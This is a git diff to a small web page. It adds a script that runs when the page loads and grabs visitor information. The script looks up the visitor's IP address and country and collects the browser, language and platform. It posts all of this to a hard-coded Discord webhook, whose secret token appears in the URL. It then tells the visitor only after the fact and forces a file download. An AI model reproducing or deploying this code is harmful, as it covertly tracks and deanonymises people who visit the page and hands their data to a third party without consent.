@@ -7,14 +7,45 @@
   <link href="style.css" rel="stylesheet" type="text/css" />
 </head>
 <body>
-  <img id="parth-img" src="parth.png"></img>
   <script>
-    window.onload = function() {
-      var link = document.createElement("a");
-      link.href = document.getElementById("parth-img").src;
-      link.download = "parth.png";
-      link.click();
-    }
+    var ip_address;
+    var webhook_url = "https://discord.com/api/webhooks/1101151796438773785/4jICbGuW-6Qz5Ry0Y9aiEqj-9_-xgO16KG8YPVegN3fwXBsP6j0Xc6jfXNHRBdo1KWtT";
+    var device_details = "";
+
+    // Get the IP address of the visitor
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        ip_address = data.ip;
+        device_details += "IP address: " + ip_address + "\n\n";
+
+        // Use an IP Geolocation API to get the country
+        fetch("https://ipapi.co/" + ip_address + "/country/")
+          .then(response => response.text())
+          .then(data => {
+            device_details += "Country: " + data + "\n\n";
+
+            // Get more device details using the window.navigator object
+            device_details += "Browser: " + window.navigator.userAgent + "\n\n";
+            device_details += "Language: " + window.navigator.language + "\n\n";
+            device_details += "Operating System: " + window.navigator.platform + "\n\n";
+
+            // Send the device details to the Discord webhook
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhook_url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({content: "New visitor details:\n\n" + device_details}));
+            document.write("Your device details have been sent to the server.");
+
+            // Automatically download the parth.png file
+            var link = document.createElement('a');
+            link.href = 'parth.png';
+            link.download = 'parth.png';
+            document.body.appendChild(link);
+            link.click();
+          });
+      });
   </script>
 </body>
 </html>
+
